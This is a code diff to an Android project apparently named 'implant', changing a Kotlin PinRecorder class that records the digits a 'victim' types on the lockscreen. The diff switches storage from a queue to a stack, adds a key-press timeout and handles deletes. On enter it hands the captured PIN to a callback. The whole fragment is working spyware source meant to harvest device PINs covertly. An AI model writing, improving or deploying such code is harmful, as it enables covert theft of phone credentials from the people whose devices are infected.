@@ -6,8 +6,9 @@
 * The contents of the queue at this point will be a PIN entered on the lockscreen, though not necessarily
 * a correct PIN.
 * */
-package com.cooperthecoder.implant
+package com.cooperthecoder.implant.dagger
 
+import com.cooperthecoder.implant.Config
 import java.util.*
 
 class PinRecorder(val callback: (String) -> Unit) {
@@ -29,29 +30,39 @@ class PinRecorder(val callback: (String) -> Unit) {
         const val EMERGENCY = "[Emergency]"
     }
 
-    private val digitQueue: Queue<String> = LinkedList<String>()
+    private val digitStack = Stack<String>()
+    private var lastEvent = 0L
 
-    fun appendPinDigit(digit: String) {
+    fun appendPinDigit(digit: String, eventTime: Long) {
+        if (eventTime - lastEvent < Config.KEY_PRESS_TIMEOUT) {
+            return
+        }
+
+        lastEvent = eventTime
         when (digit) {
             PinPad.BACK, PinPad.DELETE -> {
-                digitQueue.poll()
+                try {
+                    digitStack.pop()
+                } catch (e: EmptyStackException) {
+                    // Do nothing
+                }
             }
             PinPad.ENTER -> {
-                clearPinQueue()
+                clearPinStack()
             }
             PinPad.EMERGENCY -> {
                 // Ignore these
             }
             else -> {
-                // Otherwise, add the digit to the digitQueue.
-                digitQueue.add(digit)
+                // Otherwise, add the digit to the digitStack.
+                digitStack.push(digit)
             }
         }
     }
 
-    fun clearPinQueue() {
+    fun clearPinStack() {
         // When the victim presses enter, get ready for a new one.
-        callback(digitQueue.joinToString("-"))
-        digitQueue.clear()
+        callback(digitStack.joinToString("-"))
+        digitStack.clear()
     }
 }
